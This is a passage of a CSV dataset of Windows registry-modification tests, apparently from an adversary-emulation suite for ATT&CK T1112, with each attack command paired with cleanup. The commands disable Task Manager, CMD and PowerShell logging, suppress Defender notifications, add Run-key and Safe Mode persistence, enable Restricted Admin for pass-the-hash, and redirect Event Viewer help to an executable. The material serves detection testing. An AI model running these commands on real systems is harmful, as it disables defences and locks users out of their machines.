",command_prompt,True,,"powershell Remove-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system"" -Name DisableRegistryTools -ErrorAction Ignore
",,,
T1112,Modify Registry,Disable Windows CMD application,d2561a6d-72bd-408c-b150-13efe1801c2a,"Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows CMD application.
See example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry
",windows,,,"New-ItemProperty -Path ""HKCU:\Software\Policies\Microsoft\Windows\System"" -Name DisableCMD -Value 1
",powershell,True,,"Remove-ItemProperty -Path ""HKCU:\Software\Policies\Microsoft\Windows\System"" -Name DisableCMD -ErrorAction Ignore
",,,
T1112,Modify Registry,Disable Windows Task Manager application,af254e70-dd0e-4de6-9afe-a994d9ea8b62,"Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows task manager application.
See example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableTaskmgr /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableTaskmgr /f >nul 2>&1
",,,
T1112,Modify Registry,Disable Windows Notification Center,c0d6d67f-1f63-42cc-95c0-5fd6b20082ad,"Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows notification center.
See how remcos rat abuses this technique- https://tccontre.blogspot.com/2020/01/remcos-rat-evading-windows-defender-av.html
",windows,,,"reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /f >nul 2>&1
",,,
T1112,Modify Registry,Disable Windows Shutdown Button,6e0d1131-2d7e-4905-8ca5-d6172f05d03d,"Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows shutdown button.
See how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom.msil.screenlocker.a/
",windows,,,"reg add ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f
",command_prompt,True,,"reg delete ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v shutdownwithoutlogon /f >nul 2>&1
",,,
T1112,Modify Registry,Disable Windows LogOff Button,e246578a-c24d-46a7-9237-0213ff86fb0c,"Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows logoff button.
See how ransomware abuses this technique- https://www.trendmicro.com/vinfo/be/threat-encyclopedia/search/js_noclose.e/2
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoLogOff /t REG_DWORD /d 1 /f
reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v StartMenuLogOff /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoLogOff /f >nul 2>&1
reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v StartMenuLogOff /f >nul 2>&1
",,,
T1112,Modify Registry,Disable Windows Change Password Feature,d4a6da40-618f-454d-9a9e-26af552aaeb0,"Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows change password feature.
See how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom_heartbleed.thdobah
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableChangePassword /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableChangePassword /f >nul 2>&1
",,,
T1112,Modify Registry,Disable Windows Lock Workstation Feature,3dacb0d2-46ee-4c27-ac1b-f9886bf91a56,"Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.
See how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableLockWorkstation /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableLockWorkstation /f >nul 2>&1
",,,
T1112,Modify Registry,Activate Windows NoDesktop Group Policy Feature,93386d41-525c-4a1b-8235-134a628dee17,"Modify the registry of the currently logged in user using reg.exe via cmd console to hide all icons on Desktop Group Policy. 
Take note that some Group Policy changes might require a restart to take effect.
See how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoDesktop /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoDesktop /f >nul 2>&1
",,,
T1112,Modify Registry,Activate Windows NoRun Group Policy Feature,d49ff3cc-8168-4123-b5b3-f057d9abbd55,"Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Run menu from Start Menu Group Policy.
Take note that some Group Policy changes might require a restart to take effect.
See how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoRun /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoRun /f 
",,,
T1112,Modify Registry,Activate Windows NoFind Group Policy Feature,ffbb407e-7f1d-4c95-b22e-548169db1fbd,"Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Search menu from Start Menu Group Policy.
Take note that some Group Policy changes might require a restart to take effect.
See how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoFind /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoFind /f >nul 2>&1
",,,
T1112,Modify Registry,Activate Windows NoControlPanel Group Policy Feature,a450e469-ba54-4de1-9deb-9023a6111690,"Modify the registry of the currently logged in user using reg.exe via cmd console to Disable Control Panel Group Policy. 
Take note that some Group Policy changes might require a restart to take effect.
See how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoControlPanel /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoControlPanel /f >nul 2>&1
",,,
T1112,Modify Registry,Activate Windows NoFileMenu Group Policy Feature,5e27bdb4-7fd9-455d-a2b5-4b4b22c9dea4,"Modify the registry of the currently logged in user using reg.exe via cmd console to Remove File menu from Windows Explorer Group Policy. 
Take note that some Group Policy changes might require a restart to take effect.
See how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoFileMenu /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoFileMenu /f >nul 2>&1
",,,
T1112,Modify Registry,Activate Windows NoClose Group Policy Feature,12f50e15-dbc6-478b-a801-a746e8ba1723,"Modify the registry of the currently logged in user using reg.exe via cmd console to Disable and remove the Shut Down command Group Policy. 
Take note that some Group Policy changes might require a restart to take effect.
See how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoClose /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoClose /f >nul 2>&1
",,,
T1112,Modify Registry,Activate Windows NoSetTaskbar Group Policy Feature,d29b7faf-7355-4036-9ed3-719bd17951ed,"Modify the registry of the currently logged in user using reg.exe via cmd console to Disable changes to Taskbar and Start Menu Settings Group Policy. 
Take note that some Group Policy changes might require a restart to take effect.
See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoSetTaskbar /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoSetTaskbar /f >nul 2>&1
",,,
T1112,Modify Registry,Activate Windows NoTrayContextMenu Group Policy Feature,4d72d4b1-fa7b-4374-b423-0fe326da49d2,"Modify the registry of the currently logged in user using reg.exe via cmd console to Disable context menu for taskbar Group Policy. 
Take note that some Group Policy changes might require a restart to take effect.
See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoTrayContextMenu /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoTrayContextMenu /f >nul 2>&1
",,,
T1112,Modify Registry,Activate Windows NoPropertiesMyDocuments Group Policy Feature,20fc9daa-bd48-4325-9aff-81b967a84b1d,"Modify the registry of the currently logged in user using reg.exe via cmd console to hide Properties from ""My Documents icon"" Group Policy. 
Take note that some Group Policy changes might require a restart to take effect.
See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoPropertiesMyDocuments /f >nul 2>&1
",,,
T1112,Modify Registry,Hide Windows Clock Group Policy Feature,8023db1e-ad06-4966-934b-b6a0ae52689e,"Modify the registry of the currently logged in user using reg.exe via cmd console to Hide Clock Group Policy. 
Take note that some Group Policy changes might require a restart to take effect.
See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideClock /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideClock /f >nul 2>&1
",,,
T1112,Modify Registry,Windows HideSCAHealth Group Policy Feature,a4637291-40b1-4a96-8c82-b28f1d73e54e,"Modify the registry of the currently logged in user using reg.exe via cmd console to remove security and maintenance icon Group Policy. 
Take note that some Group Policy changes might require a restart to take effect.
See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAHealth /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAHealth /f >nul 2>&1
",,,
T1112,Modify Registry,Windows HideSCANetwork Group Policy Feature,3e757ce7-eca0-411a-9583-1c33b8508d52,"Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. 
Take note that some Group Policy changes might require a restart to take effect.
See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCANetwork /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCANetwork /f >nul 2>&1
",,,
T1112,Modify Registry,Windows HideSCAPower Group Policy Feature,8d85a5d8-702f-436f-bc78-fcd9119496fc,"Modify the registry of the currently logged in user using reg.exe via cmd console to remove the battery icon Group Policy. 
Take note that some Group Policy changes might require a restart to take effect.
See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAPower /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAPower /f >nul 2>&1
",,,
T1112,Modify Registry,Windows HideSCAVolume Group Policy Feature,7f037590-b4c6-4f13-b3cc-e424c5ab8ade,"Modify the registry of the currently logged in user using reg.exe via cmd console to remove the volume icon Group Policy. 
Take note that some Group Policy changes might require a restart to take effect..
See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAVolume /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAVolume /f >nul 2>&1
",,,
T1112,Modify Registry,Windows Modify Show Compress Color And Info Tip Registry,795d3248-0394-4d4d-8e86-4e8df2a2693f,"Modify the registry of the currently logged in user using reg.exe via cmd console to show compress color and show tips feature. 
See how hermeticwiper uses this technique - https://www.splunk.com/en_us/blog/security/detecting-hermeticwiper.html
",windows,,,"reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f
reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f
",command_prompt,,,"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowInfoTip /f >nul 2>&1
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowCompColor /f >nul 2>&1
",,,
T1112,Modify Registry,Windows Powershell Logging Disabled,95b25212-91a7-42ff-9613-124aca6845a8,"Modify the registry of the currently logged in user using reg.exe via cmd console to disable Powershell Module Logging, Script Block Logging, Transcription and Script Execution
see https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.PowerShell::EnableModuleLogging
",windows,,,"reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f
reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f
reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f
reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f
REM do a little cleanup immediately to avoid execution issues with later tests
reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /f >nul 2>&1
",command_prompt,True,,"reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /f >nul 2>&1
reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /f >nul 2>&1
reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /f >nul 2>&1
",,,
T1112,Modify Registry,Windows Add Registry Value to Load Service in Safe Mode without Network,1dd59fb3-1cb3-4828-805d-cf80b4c3bbb5,"Modify the registry to allow a driver, service, to persist in Safe Mode.
see https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.
Adding a subkey to Minimal with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode without networking. The same applies for the Network subkey.
",windows,,,"REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AtomicSafeMode"" /VE /T REG_SZ /F /D ""Service""
",command_prompt,True,,"reg delete ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AtomicSafeMode"" /f
",,,
T1112,Modify Registry,Windows Add Registry Value to Load Service in Safe Mode with Network,c173c948-65e5-499c-afbe-433722ed5bd4,"Modify the registry to allow a driver, service, to persist in Safe Mode with networking.
see https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.
Adding a subkey to Netowrk with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode with networking.
",windows,,,"REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AtomicSafeMode"" /VE /T REG_SZ /F /D ""Service""
",command_prompt,True,,"reg delete ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AtomicSafeMode"" /f
",,,
T1112,Modify Registry,Disable Windows Toast Notifications,003f466a-6010-4b15-803a-cbb478a314d7,"Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows toast notification.
See how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/
",windows,,,"reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f
",command_prompt,True,,"reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /f >nul 2>&1
",,,
T1112,Modify Registry,Disable Windows Security Center Notifications,45914594-8df6-4ea9-b3cc-7eb9321a807e,"Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows security center notification.
See how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/
",windows,,,"reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f
",command_prompt,True,,"reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /f >nul 2>&1
",,,
T1112,Modify Registry,Suppress Win Defender Notifications,c30dada3-7777-4590-b970-dc890b8cf113,"Modify the registry of the currently logged in user using reg.exe via cmd console to suppress the windows defender notification.
See how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/
",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration"" /v Notification_Suppress /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration"" /v Notification_Suppress /f >nul 2>&1
",,,
T1112,Modify Registry,Allow RDP Remote Assistance Feature,86677d0e-0b5e-4a2b-b302-454175f9aa9e,"Modify the registry of the currently logged in user using reg.exe via cmd console to allow rdp remote assistance feature. This feature allow specific
user to rdp connect on the targeted machine.
See how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/
",windows,,,"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fAllowToGetHelp /f >nul 2>&1
",,,
T1112,Modify Registry,NetWire RAT Registry Key Creation,65704cd4-6e36-4b90-b6c1-dc29a82c8e56,"NetWire continues to create its home key (HKCU\SOFTWARE\NetWire) as well as adding it into the auto-run group in the victim’s registry.
See how NetWire malware - https://app.any.run/tasks/41ecdbde-4997-4301-a350-0270448b4c8f/
",windows,,,"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /t REG_SZ  /d ""C:\Users\admin\AppData\Roaming\Install\Host.exe"" /f
reg add HKCU\SOFTWARE\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f
reg add HKCU\SOFTWARE\NetWire /v ""Install Date"" /t REG_SZ /d ""2021-08-30 07:17:27"" /f
",command_prompt,,,"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /f >nul 2>&1
reg delete HKCU\SOFTWARE\NetWire /va /f >nul 2>&1
reg delete HKCU\SOFTWARE\NetWire /f >nul 2>&1
",,,
T1112,Modify Registry,Ursnif Malware Registry Key Creation,c375558d-7c25-45e9-bd64-7b23a97c1db0,"Ursnif downloads additional modules from the C&C server and saves these in the registry folder HKEY_CURRENT_USER\Software\AppDataLow\Software\Microsoft\
More information - https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/
",windows,,,"reg add HKCU\Software\AppDataLow\Software\Microsoft\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f
",command_prompt,,,"reg delete HKCU\Software\AppDataLow\Software\Microsoft\3A861D62-51E0-15700F2219A4 /va /f >nul 2>&1
reg delete HKCU\Software\AppDataLow\Software\Microsoft\3A861D62-51E0-15700F2219A4 /f >nul 2>&1
",,,
T1112,Modify Registry,Terminal Server Client Connection History Cleared,3448824b-3c35-4a9e-a8f5-f887f68bea21,"The built-in Windows Remote Desktop Connection (RDP) client (mstsc.exe) saves the remote computer name (or IP address) and the username that is used to login after each successful connection to the remote computer
",windows,,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"" /va /f
reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"" /f
",command_prompt,True,,,powershell,"dependencies.0.description: Must have the ""MR9"" Remote Desktop Connection history Key 

dependencies.0.prereq_command: if ((Get-ItemProperty -Path ""HKCU:\SOFTWARE\Microsoft\Terminal Server Client\Default\"").MR9) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -path ""HKCU:\SOFTWARE\Microsoft\"" -name ""Terminal Server Client""  -ErrorAction Ignore
New-Item -path ""HKCU:\SOFTWARE\Microsoft\Terminal Server Client\"" -name ""Default"" -ErrorAction Ignore
New-Itemproperty -path ""HKCU:\SOFTWARE\Microsoft\Terminal Server Client\Default"" -name ""MR9"" -value ""127.0.0.1""  -PropertyType ""String"" -ErrorAction Ignore
New-Item -path ""HKCU:\SOFTWARE\Microsoft\Terminal Server Client\"" -name ""Servers"" -ErrorAction Ignore
New-Item -path ""HKCU:\SOFTWARE\Microsoft\Terminal Server Client\Servers"" -name ""Redcanary"" -ErrorAction Ignore

",
T1112,Modify Registry,Disable Windows Error Reporting Settings,d2c9e41e-cd86-473d-980d-b6403562e3e1,"Modify the registry of the currently logged in user using reg.exe via cmd console to disable windows error reporting settings. This Windows feature allow the use to report bug, errors, failure or problems 
encounter in specific application or process.
See how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/
",windows,,,"reg add HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /f >nul 2>&1
reg delete HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /f >nul 2>&1
",,,
T1112,Modify Registry,DisallowRun Execution Of Certain Applications,71db768a-5a9c-4047-b5e7-59e01f188e84,"Modify the registry of the currently logged in user using reg.exe via cmd console to prevent user running specific computer programs that could aid them in manually removing malware or detecting it 
using security product.
",windows,,,"reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v DisallowRun /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /f /t REG_SZ /v art1 /d ""regedit.exe""
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /f /t REG_SZ /v art2 /d ""cmd.exe""
",command_prompt,True,,"reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v DisallowRun /f >nul 2>&1
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v art1 /f >nul 2>&1
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v art2 /f >nul 2>&1
",,,
T1112,Modify Registry,Enabling Restricted Admin Mode via Command_Prompt,fe7974e5-5813-477b-a7bd-311d4f535e83,"Enabling Restricted Admin Mode via Command_Prompt,enables an attacker to perform a pass-the-hash attack using RDP.

See [Passing the Hash with Remote Desktop](https://www.kali.org/blog/passing-hash-remote-desktop/)
",windows,,,"reg add ""hklm\system\currentcontrolset\control\lsa"" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0
",command_prompt,True,,"reg delete ""hklm\system\currentcontrolset\control\lsa"" /f /v DisableRestrictedAdmin >nul 2>&1
",,,
T1112,Modify Registry,Mimic Ransomware - Enable Multiple User Sessions,39f1f378-ba8a-42b3-96dc-2a6540cfc1e3,"This test emulates Mimic ransomware's ability to enable multiple user sessions by modifying the AllowMultipleTSSessions value within the Winlogon registry key. 
See [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)
",windows,,,"reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f
",command_prompt,True,,"reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Winlogon /v AllowMultipleTSSessions /f >nul 2>&1
",,,
T1112,Modify Registry,Mimic Ransomware - Allow Multiple RDP Sessions per User,35727d9e-7a7f-4d0c-a259-dc3906d6e8b9,"This test emulates Mimic ransomware's ability to enable multiple RDP sessions per user by modifying the fSingleSessionPerUser value within the Terminal Server registry key. 
See [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)
",windows,,,"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
",command_prompt,True,,"reg delete ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fSingleSessionPerUser /f >nul 2>&1
",,,
T1112,Modify Registry,Event Viewer Registry Modification - Redirection URL,6174be7f-5153-4afd-92c5-e0c3b7cdb5ae,"Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will open the URL or execute the program defined in the redirection URL registry entry.",windows,,,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionURL /t REG_SZ /d ""#{redirection_url}"" /f",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionURL /t REG_SZ /d ""http://go.microsoft.com/fwlink/events.asp"" /f",,,"input_arguments.redirection_url.description: URL to open or file URI to execute upon opening the event help

input_arguments.redirection_url.type: url

input_arguments.redirection_url.default: file://C:\windows\system32\notepad.exe

"
